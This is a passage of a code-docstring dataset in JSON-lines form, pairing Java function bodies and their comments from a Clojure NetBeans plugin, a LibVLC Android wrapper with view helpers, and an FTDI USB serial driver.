.addContainerGap()\n                    .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n                        .addComponent(projectNameLabel)\n                        .addComponent(projectNameLabel1))\n                    .addGap(37, 37, 37)\n                    .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n                        .addComponent(packageNameTextField, javax.swing.GroupLayout.DEFAULT_SIZE, 639, Short.MAX_VALUE)\n                        .addComponent(projectNameTextField, javax.swing.GroupLayout.DEFAULT_SIZE, 639, Short.MAX_VALUE)))\n                .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()\n                    .addGap(23, 23, 23)\n                    .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n                        .addComponent(projectLocationLabel)\n                        .addComponent(createdFolderLabel))\n                    .addGap(10, 10, 10)\n                    .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)\n                        .addComponent(projectLocationTextField, javax.swing.GroupLayout.DEFAULT_SIZE, 584, Short.MAX_VALUE)\n                        .addComponent(createdFolderTextField, javax.swing.GroupLayout.DEFAULT_SIZE, 584, Short.MAX_VALUE))\n                    .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)\n                    .addComponent(browseButton)))\n            .addContainerGap())\n    );\n    layout.setVerticalGroup(\n        layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n        .addGroup(layout.createSequentialGroup()\n            .addContainerGap()\n            .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)\n                .addComponent(projectNameLabel)\n                .addComponent(projectNameTextField, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))\n            .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)\n            .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)\n                .addComponent(projectNameLabel1)\n                .addComponent(packageNameTextField, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))\n            .addGap(18, 18, 18)\n            .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)\n                .addComponent(projectLocationLabel)\n                .addComponent(projectLocationTextField, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)\n                .addComponent(browseButton))\n            .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)\n            .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)\n                .addComponent(createdFolderLabel)\n                .addComponent(createdFolderTextField, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))\n            .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))\n    );\n\n    projectNameLabel.getAccessibleContext().setAccessibleName(org.openide.util.NbBundle.getMessage(ClojureTemplatePanelVisual.class, \"ClojureTemplatePanelVisual.projectNameLabel.text\")); // NOI18N\n    projectLocationLabel.getAccessibleContext().setAccessibleName(org.openide.util.NbBundle.getMessage(ClojureTemplatePanelVisual.class, \"ClojureTemplatePanelVisual.projectLocationLabel.text\")); // NOI18N\n    browseButton.getAccessibleContext().setAccessibleName(org.openide.util.NbBundle.getMessage(ClojureTemplatePanelVisual.class, \"ClojureTemplatePanelVisual.browseButton.AccessibleContext.accessibleName\")); // NOI18N\n}", "path": "netbeans\\plugins\\org-enclojure-plugin\\src\\main\\java\\org\\enclojure\\ide\\nb\\clojure\\project\\ClojureTemplatePanelVisual.java", "repo_name": "ericthorsen/enclojure", "stars": 82, "license": "None", "language": "java", "size": 87907}
{"docstring": "/**\n * Merges this frame with the given frame (case of a RET instruction).\n * \n * @param frame a frame\n * @param access the local variables that have been accessed by the\n *        subroutine to which the RET instruction corresponds.\n * @return <tt>true</tt> if this frame has been changed as a result of the\n *         merge operation, or <tt>false</tt> otherwise.\n */\n", "func_signal": "public boolean merge(final Frame frame, final boolean[] access)", "code": "{\n    boolean changes = false;\n    for (int i = 0; i < locals; ++i) {\n        if (!access[i] && !values[i].equals(frame.values[i])) {\n            values[i] = frame.values[i];\n            changes = true;\n        }\n    }\n    return changes;\n}", "path": "org-enclojure-ide\\src\\main\\java\\org\\enclojure\\ide\\asm\\tree\\analysis\\Frame.java", "repo_name": "ericthorsen/enclojure", "stars": 82, "license": "None", "language": "java", "size": 87907}
{"docstring": "/** Handles changes in the Project name and project directory, */\n", "func_signal": "private void updateTexts(DocumentEvent e)", "code": "{\n\n    Document doc = e.getDocument();\n\n    if (doc == projectNameTextField.getDocument() || \n        doc == projectLocationTextField.getDocument()) {\n        try {\n            // Change in the project name\n            String projectName = projectNameTextField.getText();\n            String projectFolder = projectLocationTextField.getText();\n            File tf = new File(projectFolder);\n            String cp = tf.getCanonicalPath();\n            if (cp.endsWith(File.separator))\n                cp += projectName;\n            cp+= File.separatorChar + projectName;\n            createdFolderTextField.setText(cp);\n        } catch (IOException ex) {\n            Exceptions.printStackTrace(ex);\n        }\n    }\n    panel.fireChangeEvent(); // Notify that the panel changed\n}", "path": "netbeans\\plugins\\org-enclojure-plugin\\src\\main\\java\\org\\enclojure\\ide\\nb\\clojure\\project\\ClojureTemplatePanelVisual.java", "repo_name": "ericthorsen/enclojure", "stars": 82, "license": "None", "language": "java", "size": 87907}
{"docstring": "/**\n * Copies the state of the given frame into this frame.\n * \n * @param src a frame.\n * @return this frame.\n */\n", "func_signal": "public Frame init(final Frame src)", "code": "{\n    System.arraycopy(src.values, 0, values, 0, values.length);\n    top = src.top;\n    return this;\n}", "path": "org-enclojure-ide\\src\\main\\java\\org\\enclojure\\ide\\asm\\tree\\analysis\\Frame.java", "repo_name": "ericthorsen/enclojure", "stars": 82, "license": "None", "language": "java", "size": 87907}
{"docstring": "// vod\u89e3\u6790\u540e\u7684vod\u5217\u8868\n", "func_signal": "public MediaResource()", "code": "{\n       mHighQualGroup = new MediaResourceGroup();\n       mLowQualGroup = new MediaResourceGroup();\n   }", "path": "android\\LibMediaPlayer\\src\\tv\\danmaku\\media\\MediaResource.java", "repo_name": "bilibili/vlc-android-macbuild", "stars": 71, "license": "other", "language": "java", "size": 2516}
{"docstring": "/*--------------------------------------\n * View OnTouchListener\n */\n", "func_signal": "public static void setOnTouchListener(View container, int id,\n        View.OnTouchListener listener)", "code": "{\n    if (container == null)\n        return;\n\n    container.findViewById(id).setOnTouchListener(listener);\n}", "path": "android\\LibUtility\\src\\tv\\danmaku\\android\\ViewHelper.java", "repo_name": "bilibili/vlc-android-macbuild", "stars": 71, "license": "other", "language": "java", "size": 2516}
{"docstring": "/**\n * Open the Java audio output. This function is called by the native code\n */\n", "func_signal": "public void initAout(int sampleRateInHz, int channels, int samples)", "code": "{\n    DebugLog.d(TAG, \"Opening the java audio output\");\n    mAout.init(sampleRateInHz, channels, samples);\n}", "path": "android\\LibMediaPlayer\\src\\org\\videolan\\vlc\\LibVLC.java", "repo_name": "bilibili/vlc-android-macbuild", "stars": 71, "license": "other", "language": "java", "size": 2516}
{"docstring": "/**\n * Singleton constructor Without surface and vout to create the thumbnail\n * and get information e.g. on the MediaLibraryAcitvity\n * \n * @return\n * @throws LibVlcException\n */\n", "func_signal": "public static LibVLC getInstance(Context context,\n        LibVlcLibraryLoader libLoader) throws LibVlcException", "code": "{\n    synchronized (LibVLC.class) {\n        if (sInstance == null) {\n            /* First call */\n            loadLib(context, libLoader);\n            sInstance = new LibVLC();\n\n            ArrayList<String> params = new ArrayList<String>();\n            CollectionHelper.Append(params, sDefaultParameters);\n\n            DebugLog.v(TAG, \"libvlc arguments:\");\n            for (String par : params) {\n                DebugLog.v(TAG, \"    \" + par);\n            }\n\n            sInstance.initEx(params.toArray(new String[params.size()]));\n        }\n\n        return sInstance;\n    }\n}", "path": "android\\LibMediaPlayer\\src\\org\\videolan\\vlc\\LibVLC.java", "repo_name": "bilibili/vlc-android-macbuild", "stars": 71, "license": "other", "language": "java", "size": 2516}
{"docstring": "/**\n * Read a media.\n */\n", "func_signal": "public void readMediaEx(String mrl, String[] options)", "code": "{\n    DebugLog.v(TAG, \"Reading \" + mrl);\n\n    DebugLog.v(TAG, \"libvlcplayer options:\");\n    for (String opt : options) {\n        DebugLog.v(TAG, \"    \" + opt);\n    }\n\n    readMediaEx(mLibVlcInstance, mrl, options);\n}", "path": "android\\LibMediaPlayer\\src\\org\\videolan\\vlc\\LibVLC.java", "repo_name": "bilibili/vlc-android-macbuild", "stars": 71, "license": "other", "language": "java", "size": 2516}
{"docstring": "/**\n * Destroy this libVLC instance\n * \n * @note You must call it before exiting\n */\n", "func_signal": "public void destroy()", "code": "{\n    DebugLog.v(TAG, \"Destroying LibVLC instance\");\n    nativeDestroy();\n    detachEventManager();\n    mIsInitialized = false;\n}", "path": "android\\LibMediaPlayer\\src\\org\\videolan\\vlc\\LibVLC.java", "repo_name": "bilibili/vlc-android-macbuild", "stars": 71, "license": "other", "language": "java", "size": 2516}
{"docstring": "/**\n * Close the Java audio output This function is called by the native code\n */\n", "func_signal": "public void closeAout()", "code": "{\n    DebugLog.d(TAG, \"Closing the java audio output\");\n    mAout.release();\n}", "path": "android\\LibMediaPlayer\\src\\org\\videolan\\vlc\\LibVLC.java", "repo_name": "bilibili/vlc-android-macbuild", "stars": 71, "license": "other", "language": "java", "size": 2516}
{"docstring": "/*--------------------------------------\n * ImageView setImageDrawable\n */\n", "func_signal": "public static void setImageDrawable(View container, int id, int drawableId)", "code": "{\n    if (container == null)\n        return;\n\n    setImageDrawable(container.findViewById(id),\n            ResourcesHelper.getDrawable(container.getContext(), drawableId));\n}", "path": "android\\LibUtility\\src\\tv\\danmaku\\android\\ViewHelper.java", "repo_name": "bilibili/vlc-android-macbuild", "stars": 71, "license": "other", "language": "java", "size": 2516}
{"docstring": "// \u4e0d\u5305\u62ec\u70b9\u53f7\n", "func_signal": "public static String getUriFileExtension(String url)", "code": "{\n    if (TextUtils.isEmpty(url))\n        return url;\n\n    Uri uri = Uri.parse(url);\n    String path = uri.getLastPathSegment();\n    if (TextUtils.isEmpty(path))\n        return null;\n\n    int extPos = path.lastIndexOf(\".\");\n    if (extPos == -1 || extPos >= path.length())\n        return null;\n\n    return path.substring(extPos + 1);\n}", "path": "android\\LibUtility\\src\\tv\\danmaku\\android\\util\\UriHelper.java", "repo_name": "bilibili/vlc-android-macbuild", "stars": 71, "license": "other", "language": "java", "size": 2516}
{"docstring": "// ListView\n", "func_signal": "public static View getChildAtPosition(ListView listView, int position)", "code": "{\n    int firstPostion = listView.getFirstVisiblePosition();\n    int lastPostion = listView.getLastVisiblePosition();\n\n    if ((position < firstPostion) || (position > lastPostion)) {\n        return null;\n    }\n\n    return listView.getChildAt(position - firstPostion\n            + listView.getHeaderViewsCount());\n}", "path": "android\\LibUtility\\src\\tv\\danmaku\\android\\ViewHelper.java", "repo_name": "bilibili/vlc-android-macbuild", "stars": 71, "license": "other", "language": "java", "size": 2516}
{"docstring": "/* Load library before object instantiation */\n", "func_signal": "private static void loadLib(Context context, LibVlcLibraryLoader libLoader)\n        throws LibVlcException", "code": "{\n    synchronized (LibVLC.class) {\n        if (!mLibIomxLoaded) {\n            try {\n                libLoader.loadVlcLibIomx(context);\n            } catch (Throwable t) {\n                DebugLog.w(TAG, \"Unable to load the iomx library: \" + t);\n                System.exit(1);\n            }\n        }\n\n        if (mLibVlcLoaded)\n            return;\n\n        try {\n            DebugLog.d(TAG, \"loading vlcjni\");\n            libLoader.loadLibVlc(context);\n            DebugLog.d(TAG, \"vlcjni loaded: \");\n            mLibVlcLoaded = true;\n        } catch (UnsatisfiedLinkError ule) {\n            DebugLog.e(TAG, \"Can't load vlcjni library: \" + ule);\n            // / FIXME: Alert user\n            System.exit(1);\n        } catch (SecurityException se) {\n            DebugLog.e(TAG,\n                    \"Encountered a security issue when loading vlcjni library: \"\n                            + se);\n            // / FIXME: Alert user\n            System.exit(1);\n        }\n    }\n}", "path": "android\\LibMediaPlayer\\src\\org\\videolan\\vlc\\LibVLC.java", "repo_name": "bilibili/vlc-android-macbuild", "stars": 71, "license": "other", "language": "java", "size": 2516}
{"docstring": "/*--------------------------------------\n * TextView setText\n */\n", "func_signal": "public static void setText(Activity container, int id, int resource)", "code": "{\n    if (container == null)\n        return;\n\n    setText(container, id, container.getString(resource));\n}", "path": "android\\LibUtility\\src\\tv\\danmaku\\android\\ViewHelper.java", "repo_name": "bilibili/vlc-android-macbuild", "stars": 71, "license": "other", "language": "java", "size": 2516}
{"docstring": "/*--------------------------------------\n * TextView setTypeface\n */\n", "func_signal": "public static void setTypeface(View container, int id, Typeface face)", "code": "{\n    if (container == null)\n        return;\n\n    setTypeface(container.findViewById(id), face);\n}", "path": "android\\LibUtility\\src\\tv\\danmaku\\android\\ViewHelper.java", "repo_name": "bilibili/vlc-android-macbuild", "stars": 71, "license": "other", "language": "java", "size": 2516}
{"docstring": "/**\n * Initialize the libVLC class\n */\n", "func_signal": "private void initEx(String[] params) throws LibVlcException", "code": "{\n    DebugLog.v(TAG, \"Initializing LibVLC\");\n    if (!mIsInitialized) {\n        nativeInitEx(Pragma.DEBUG, params);\n        setEventManager(EventManager.getIntance());\n        mIsInitialized = true;\n    }\n}", "path": "android\\LibMediaPlayer\\src\\org\\videolan\\vlc\\LibVLC.java", "repo_name": "bilibili/vlc-android-macbuild", "stars": 71, "license": "other", "language": "java", "size": 2516}
{"docstring": "/*-\n * FIXME: for USB connect, this method can not be reliable.\n * Only use this method to retrieve error reason\n */\n", "func_signal": "public static boolean isConnectedOrConnecting(Context context)", "code": "{\n    NetworkInfo networkInfo = getActivieNetworkInfo(context);\n    if (networkInfo == null)\n        return false;\n\n    return networkInfo.isConnectedOrConnecting();\n}", "path": "android\\LibUtility\\src\\tv\\danmaku\\android\\ConnectivityManagerHelper.java", "repo_name": "bilibili/vlc-android-macbuild", "stars": 71, "license": "other", "language": "java", "size": 2516}
{"docstring": "// View BackgroundColor\n", "func_signal": "public static void setBackgroundColor(View container, int id, int color)", "code": "{\n    if (container == null)\n        return;\n\n    container.findViewById(id).setBackgroundColor(color);\n}", "path": "android\\LibUtility\\src\\tv\\danmaku\\android\\ViewHelper.java", "repo_name": "bilibili/vlc-android-macbuild", "stars": 71, "license": "other", "language": "java", "size": 2516}
{"docstring": "/*--------------------------------------\n * View Visibility\n */\n", "func_signal": "public static void setVisibility(View container, int id, int visibility)", "code": "{\n    if (container == null)\n        return;\n\n    container.findViewById(id).setVisibility(visibility);\n}", "path": "android\\LibUtility\\src\\tv\\danmaku\\android\\ViewHelper.java", "repo_name": "bilibili/vlc-android-macbuild", "stars": 71, "license": "other", "language": "java", "size": 2516}
{"docstring": "/*--------------------------------------\n * View OnClickListener\n */\n", "func_signal": "public static void setOnClickListener(View container, int id,\n        OnClickListener listener)", "code": "{\n    if (container == null)\n        return;\n\n    container.findViewById(id).setOnClickListener(listener);\n}", "path": "android\\LibUtility\\src\\tv\\danmaku\\android\\ViewHelper.java", "repo_name": "bilibili/vlc-android-macbuild", "stars": 71, "license": "other", "language": "java", "size": 2516}
{"docstring": "/**\n * Destructor: It is bad practice to rely on them, so please don't forget to\n * call destroy() before exiting.\n */\n", "func_signal": "public void finalize()", "code": "{\n    if (mLibVlcInstance != 0) {\n        DebugLog.d(TAG, \"LibVLC is was destroyed yet before finalize()\");\n        destroy();\n    }\n}", "path": "android\\LibMediaPlayer\\src\\org\\videolan\\vlc\\LibVLC.java", "repo_name": "bilibili/vlc-android-macbuild", "stars": 71, "license": "other", "language": "java", "size": 2516}
{"docstring": "/*--------------------------------------\n * Methods\n */\n", "func_signal": "@TargetApi(16)\npublic static void setStrictMode_Predefined()", "code": "{\n    if (!BuildHelper.isApi9_GingerBreadOrLater())\n        return;\n\n    /*--------------------------------------\n     * Thread Policy\n     */\n    ThreadPolicy.Builder threadPolicyBuilder = new ThreadPolicy.Builder();\n    if (THREAD__DETECT_CUSTOM_SLOW_CALLS)\n        if (BuildHelper.isApi11_HoneyCombOrLater())\n            threadPolicyBuilder = threadPolicyBuilder\n                    .detectCustomSlowCalls();\n\n    if (THREAD__DETECT_DISK_READS)\n        threadPolicyBuilder = threadPolicyBuilder.detectDiskReads();\n\n    if (THREAD__DETECT_DISK_WRITES)\n        threadPolicyBuilder = threadPolicyBuilder.detectDiskWrites();\n\n    if (THREAD__DETECT_NETWORK)\n        threadPolicyBuilder = threadPolicyBuilder.detectNetwork();\n\n    switch (sThreadPenalty) {\n    case Death:\n        threadPolicyBuilder = threadPolicyBuilder.penaltyDeath();\n        break;\n    case Dialog:\n        threadPolicyBuilder = threadPolicyBuilder.penaltyDialog();\n        break;\n    case DropBox:\n        threadPolicyBuilder = threadPolicyBuilder.penaltyDropBox();\n        break;\n    case Log:\n        threadPolicyBuilder = threadPolicyBuilder.penaltyLog();\n        break;\n    case DeathOnNetwork:\n        if (BuildHelper.isApi11_HoneyCombOrLater())\n            threadPolicyBuilder = threadPolicyBuilder\n                    .penaltyDeathOnNetwork();\n        else\n            threadPolicyBuilder = threadPolicyBuilder.penaltyLog();\n        break;\n    case FlashScreen:\n        if (BuildHelper.isApi11_HoneyCombOrLater())\n            threadPolicyBuilder = threadPolicyBuilder.penaltyFlashScreen();\n        else\n            threadPolicyBuilder = threadPolicyBuilder.penaltyLog();\n        break;\n    }\n    StrictMode.setThreadPolicy(threadPolicyBuilder.build());\n\n    /*--------------------------------------\n     * VM Policy\n     */\n    VmPolicy.Builder vmPolicyBuilder = new VmPolicy.Builder();\n    if (VM__DETECT_LEAKED_CLOSABLE_OBJECT)\n        if (BuildHelper.isApi11_HoneyCombOrLater())\n            vmPolicyBuilder = vmPolicyBuilder.detectLeakedClosableObjects();\n\n    if (VM__DETECT_LEAKED_REGISTRATION_OBJECTS)\n        if (BuildHelper.isApi16_JellyBeanOrLater())\n            vmPolicyBuilder = vmPolicyBuilder\n                    .detectLeakedRegistrationObjects();\n\n    if (VM__DETECT_LEAKED_SQLLITE_OBJECTS)\n        vmPolicyBuilder = vmPolicyBuilder.detectLeakedSqlLiteObjects();\n\n    switch (sVmPenalty) {\n    case Death:\n        vmPolicyBuilder = vmPolicyBuilder.penaltyDeath();\n        break;\n    case DropBox:\n        vmPolicyBuilder = vmPolicyBuilder.penaltyDropBox();\n        break;\n    case Log:\n        vmPolicyBuilder = vmPolicyBuilder.penaltyLog();\n        break;\n    }\n    StrictMode.setVmPolicy(vmPolicyBuilder.build());\n\n}", "path": "android\\LibUtility\\src\\tv\\danmaku\\android\\support\\StrictModeHelper.java", "repo_name": "bilibili/vlc-android-macbuild", "stars": 71, "license": "other", "language": "java", "size": 2516}
{"docstring": "// find any interfaces and set mInterface\n", "func_signal": "private boolean getUsbInterfaces(UsbDevice device)", "code": "{\n    UsbInterface[] intf = new UsbInterface[FTDI_MAX_INTERFACE_NUM];\n    boolean ret=false;\n    for (UsbId usbids : IDS) {\n        \n        if(device.getVendorId() == IGNORE_IDS.mVid ) {\n            break;\n        }\n        \n        // TODO: Refactor it for CDC\n        if (usbids.mVid == 0 && usbids.mPid == 0\n                && device.getDeviceClass() == UsbConstants.USB_CLASS_COMM) {\n            for (int i = 0; i < device.getInterfaceCount(); ++i) {\n                if (device.getInterface(i).getInterfaceClass() == UsbConstants.USB_CLASS_CDC_DATA) {\n                    intf[0] = device.getInterface(i);\n                }\n            }\n            if (intf[0] == null) {\n                return false;\n            }\n        } else {\n            intf = findUSBInterfaceByVIDPID(device, usbids.mVid,\n                    usbids.mPid);\n        }\n        if (intf[0] != null) {\n            for (int i = 0; i < usbids.mNumOfChannels; ++i) {\n                Log.d(TAG, \"Found USB interface \" + intf[i]);\n                if(!setUSBInterface(device, intf[i], i)) {\n                    return false;\n                }\n                mSelectedDeviceInfo = usbids;\n            }\n            return true;\n        }\n    }\n    return false;\n}", "path": "FTDriver\\src\\jp\\ksksue\\driver\\serial\\FTDriver.java", "repo_name": "ksksue/FTDriver", "stars": 114, "license": "None", "language": "java", "size": 765}
{"docstring": "// Open an FTDI USB Device\n", "func_signal": "public boolean begin(int baudrate)", "code": "{\n    for (UsbDevice device : mManager.getDeviceList().values()) {\n        Log.i(TAG, \"Devices : \" + device.toString());\n\n        getPermission(device);\n        if (!mManager.hasPermission(device)) {\n            return false;\n        }\n\n        // TODO: support any connections(current version find a first\n        // device)\n        if (getUsbInterfaces(device)) {\n            break;\n        }\n    }\n\n    if (mSelectedDeviceInfo == null) {\n        return false;\n    }\n\n    if (mDevice == null) {\n        return false;\n    }\n\n    if (mDevice.getDeviceClass() == UsbConstants.USB_CLASS_COMM) {\n        isCDC = true;\n    } else {\n        isCDC = false;\n    }\n\n    mFTDIEndpointIN = new UsbEndpoint[mSelectedDeviceInfo.mNumOfChannels];\n    mFTDIEndpointOUT = new UsbEndpoint[mSelectedDeviceInfo.mNumOfChannels];\n\n    if (isCDC) {\n        if (!getCdcEndpoint()) {\n            return false;\n        }\n    } else {\n        if (!setFTDIEndpoints(mInterface,\n                mSelectedDeviceInfo.mNumOfChannels)) {\n            return false;\n        }\n    }\n\n    if (isCDC) {\n        initCdcAcm(mDeviceConnection, baudrate);\n    } else {\n        initFTDIChip(mDeviceConnection, baudrate);\n    }\n\n    Log.i(TAG, \"Device Serial : \" + mDeviceConnection.getSerial());\n\n    return true;\n}", "path": "FTDriver\\src\\jp\\ksksue\\driver\\serial\\FTDriver.java", "repo_name": "ksksue/FTDriver", "stars": 114, "license": "None", "language": "java", "size": 765}
{"docstring": "/**\n * Gets number of channels\n * \n * @return Number of channels\n */\n", "func_signal": "public int getNumberOfChannels()", "code": "{\n    if (mSelectedDeviceInfo != null) {\n        return mSelectedDeviceInfo.mNumOfChannels;\n    } else {\n        return 0;\n    }\n}", "path": "FTDriver\\src\\jp\\ksksue\\driver\\serial\\FTDriver.java", "repo_name": "ksksue/FTDriver", "stars": 114, "license": "None", "language": "java", "size": 765}
{"docstring": "// searches for an interface on the given USB device by VID and PID\n", "func_signal": "private UsbInterface[] findUSBInterfaceByVIDPID(UsbDevice device, int vid,\n        int pid)", "code": "{\n    Log.d(TAG, \"findUSBInterface \" + device);\n    UsbInterface[] retIntf = new UsbInterface[FTDI_MAX_INTERFACE_NUM];\n    int j = 0;\n    int count = device.getInterfaceCount();\n    for (int i = 0; i < count; i++) {\n        UsbInterface intf = device.getInterface(i);\n        if (device.getVendorId() == vid && device.getProductId() == pid) {\n            retIntf[j] = intf;\n            ++j;\n        }\n    }\n    return retIntf;\n}", "path": "FTDriver\\src\\jp\\ksksue\\driver\\serial\\FTDriver.java", "repo_name": "ksksue/FTDriver", "stars": 114, "license": "None", "language": "java", "size": 765}
{"docstring": "// Close the device\n", "func_signal": "public void end()", "code": "{\n    if (mSelectedDeviceInfo != null) {\n        if (isCDC) {\n            if (mDeviceConnection != null) {\n                if (mInterface[0] != null) {\n                    mDeviceConnection.releaseInterface(mInterface[0]);\n                    mInterface[0] = null;\n                }\n                if (mInterface[1] != null) {\n                    mDeviceConnection.releaseInterface(mInterface[1]);\n                    mInterface[1] = null;\n                }\n                mDeviceConnection.close();\n            }\n\n            mDevice = null;\n            mDeviceConnection = null;\n        } else {\n            for (int i = 0; i < mSelectedDeviceInfo.mNumOfChannels; ++i) {\n                setUSBInterface(null, null, i);\n            }\n        }\n    }\n}", "path": "FTDriver\\src\\jp\\ksksue\\driver\\serial\\FTDriver.java", "repo_name": "ksksue/FTDriver", "stars": 114, "license": "None", "language": "java", "size": 765}
{"docstring": "/**\n * Sets flow control to an FTDI chip register\n * \n * @param channel CH_A CH_B CH_C CH_D\n * @param flowControl FTDI_SET_FLOW_CTRL_NONE FTDI_SET_FLOW_RTS_CTS_HS\n *            FTDI_SET_FLOW_DTR_DSR_HS FTDI_SET_FLOW_XON_XOFF_HS\n * @return true : succeed, false : not succeed\n */\n", "func_signal": "public boolean setFlowControl(int channel, int flowControl)", "code": "{\n    if (mDeviceConnection == null) {\n        return false;\n    }\n\n    if (isCDC) {\n        // setCdcFlowControl();\n        return true;\n    }\n\n    if (CH_A > channel || channel > CH_D) {\n        return false;\n    }\n\n    if (flowControl == FTDI_SET_FLOW_CTRL_NONE\n            || flowControl == FTDI_SET_FLOW_RTS_CTS_HS\n            || flowControl == FTDI_SET_FLOW_DTR_DSR_HS\n            || flowControl == FTDI_SET_FLOW_XON_XOFF_HS) {\n        int mask=0;\n        if(flowControl == FTDI_SET_FLOW_RTS_CTS_HS) {\n            mask = 0x1;\n        }\n        if(flowControl == FTDI_SET_FLOW_DTR_DSR_HS) {\n            mask |= 0x2;\n        }\n        int send = flowControl | mask ;\n        if (mDeviceConnection.controlTransfer(0x40, 0x01, send, channel,\n                null, 0, 0) < 0) {\n            return false;\n        } else {\n            if(LOCAL_LOGV){ Log.v(TAG, \"setFlowControl : \" + toHexStr(send)); }\n            return true;\n        }\n    } else {\n        return false;\n    }\n}", "path": "FTDriver\\src\\jp\\ksksue\\driver\\serial\\FTDriver.java", "repo_name": "ksksue/FTDriver", "stars": 114, "license": "None", "language": "java", "size": 765}
{"docstring": "/**\n * Gets an USB permission if no permission\n * \n * @param device\n * @see setPermissionIntent\n */\n", "func_signal": "public void getPermission(UsbDevice device)", "code": "{\n    if (device != null && mPermissionIntent != null) {\n        if (!mManager.hasPermission(device)) {\n            mManager.requestPermission(device, mPermissionIntent);\n        }\n    }\n}", "path": "FTDriver\\src\\jp\\ksksue\\driver\\serial\\FTDriver.java", "repo_name": "ksksue/FTDriver", "stars": 114, "license": "None", "language": "java", "size": 765}
{"docstring": "// Calculate a divisor from baud rate and base clock for FT232BM, FT2232C\n// and FT232LR\n// thanks to @titoi2\n", "func_signal": "private int calcFT232bmBaudBaseToDiv(int baud, int base)", "code": "{\n    int divisor;\n    divisor = (base / 16 / baud) | (((base / 2 / baud) & 4) != 0 ? 0x4000 // 0.5\n            : ((base / 2 / baud) & 2) != 0 ? 0x8000 // 0.25\n                    : ((base / 2 / baud) & 1) != 0 ? 0xc000 // 0.125\n                            : 0);\n    return divisor;\n}", "path": "FTDriver\\src\\jp\\ksksue\\driver\\serial\\FTDriver.java", "repo_name": "ksksue/FTDriver", "stars": 114, "license": "None", "language": "java", "size": 765}
{"docstring": "/**\n * Sets the serial property of TX ON/OFF\n * \n * @param tx TX OFF : FTDI_SET_NOBREAK TX ON : FTDI_SET_BREAK\n * @param channel CH_A CH_B CH_C CH_D\n * @return true : succeed, false : not succeed\n */\n", "func_signal": "public boolean setSerialPropertyBreak(int tx, int channel)", "code": "{\n    // TODO : test this method\n    if (tx == FTDI_SET_NOBREAK || tx == FTDI_SET_BREAK) {\n        mSerialProperty[channel - 1] = (mSerialProperty[channel - 1] & 0xBFFF)\n                | (tx & 0x4000);\n        if(LOCAL_LOGV){ Log.v(TAG, \"setSerialPropertyBreak : \" + toHexStr(mSerialProperty[channel-1])); }\n        return true;\n    } else {\n        return false;\n    }\n}", "path": "FTDriver\\src\\jp\\ksksue\\driver\\serial\\FTDriver.java", "repo_name": "ksksue/FTDriver", "stars": 114, "license": "None", "language": "java", "size": 765}
{"docstring": "/*\n * Calculate a Divisor at 48MHz 9600 : 0x4138 11400 : 0xc107 19200 : 0x809c\n * 38400 : 0xc04e 57600 : 0x0034 115200 : 0x001a 230400 : 0x000d\n */\n", "func_signal": "private int calcFTDIBaudrate(int baud, FTDICHIPTYPE chiptype)", "code": "{\n    int divisor = 0;\n    if (chiptype == FTDICHIPTYPE.FT232RL\n            || chiptype == FTDICHIPTYPE.FT2232C\n            || chiptype == FTDICHIPTYPE.FT230X) {\n        if (baud <= 3000000) {\n            divisor = calcFT232bmBaudBaseToDiv(baud, 48000000);\n        } else {\n            Log.e(TAG, \"Cannot set baud rate : \" + baud\n                    + \", because too high.\");\n            Log.e(TAG, \"Set baud rate : 9600\");\n            divisor = calcFT232bmBaudBaseToDiv(9600, 48000000);\n        }\n    } else if (chiptype == FTDICHIPTYPE.FT232H) {\n        if (baud <= 12000000 && baud >= 1200) {\n            divisor = calcFT232hBaudBaseToDiv(baud, 120000000);\n        } else {\n            Log.e(TAG, \"Cannot set baud rate : \" + baud\n                    + \", because too high.\");\n            Log.e(TAG, \"Set baud rate : 9600\");\n            divisor = calcFT232hBaudBaseToDiv(9600, 120000000);\n        }\n    }\n    return divisor;\n}", "path": "FTDriver\\src\\jp\\ksksue\\driver\\serial\\FTDriver.java", "repo_name": "ksksue/FTDriver", "stars": 114, "license": "None", "language": "java", "size": 765}
{"docstring": "// Calculate a divisor from baud rate and base clock for FT2232H and FT232H\n// thanks to @yakagawa\n", "func_signal": "private int calcFT232hBaudBaseToDiv(int baud, int base)", "code": "{\n    int divisor3, divisor;\n    divisor = (base / 10 / baud);\n    divisor3 = divisor * 8;\n    divisor |= ((divisor3 & 4) != 0 ? 0x4000 // 0.5\n            : (divisor3 & 2) != 0 ? 0x8000 // 0.25\n                    : (divisor3 & 1) != 0 ? 0xc000 // 0.125\n                            : 0);\n\n    // divisor |= 0x00020000;\n    divisor &= 0xffff;\n    return divisor;\n}", "path": "FTDriver\\src\\jp\\ksksue\\driver\\serial\\FTDriver.java", "repo_name": "ksksue/FTDriver", "stars": 114, "license": "None", "language": "java", "size": 765}
